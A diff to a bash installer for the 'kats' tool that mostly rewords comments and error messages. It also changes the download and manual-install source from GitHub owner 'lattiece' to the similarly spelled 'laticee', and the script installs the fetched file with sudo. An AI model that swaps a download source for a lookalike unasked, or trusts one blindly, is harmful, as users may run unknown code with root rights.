@@ -1,7 +1,7 @@
 #!/bin/bash
 
-# kats installation script
-# Installs the kats language analyzer tool globally
+# kats installer for macOS and Linux
+# This will download and install kats so you can use it from anywhere
 
 set -e
 
@@ -22,8 +22,8 @@ elif [[ "$OSTYPE" == "linux"* ]]; then
     INSTALL_DIR="/usr/local/bin"
     SUDO="sudo"
 else
-    echo "Error: Unsupported operating system: $OSTYPE"
-    echo "kats supports macOS and Linux only"
+    echo "Error: This installer only works on macOS and Linux"
+    echo "Your system: $OSTYPE"
     exit 1
 fi
 
@@ -42,13 +42,13 @@ TEMP_DIR=$(mktemp -d)
 trap "rm -rf $TEMP_DIR" EXIT
 
 # Download the kats script
-KATS_URL="https://raw.githubusercontent.com/lattiece/kats/main/kats"
+KATS_URL="https://raw.githubusercontent.com/laticee/kats/main/kats"
 
 if ! curl -s -L "$KATS_URL" -o "$TEMP_DIR/kats"; then
     echo "Error: Failed to download kats from $KATS_URL"
     echo "Please check your internet connection and try again"
-    echo "Alternatively, you can download manually from:"
-    echo "https://github.com/lattiece/kats"
+    echo "You can also install manually from:"
+    echo "https://github.com/laticee/kats"
     exit 1
 fi
 
@@ -71,7 +71,7 @@ if command -v kats &> /dev/null; then
     # Show version
     kats --version
 else
-    echo "Error: Installation failed. kats is not available in your PATH"
+    echo "Error: Installation failed - kats is not in your PATH"
     echo "Try installing manually or check your PATH configuration"
     exit 1
 fi
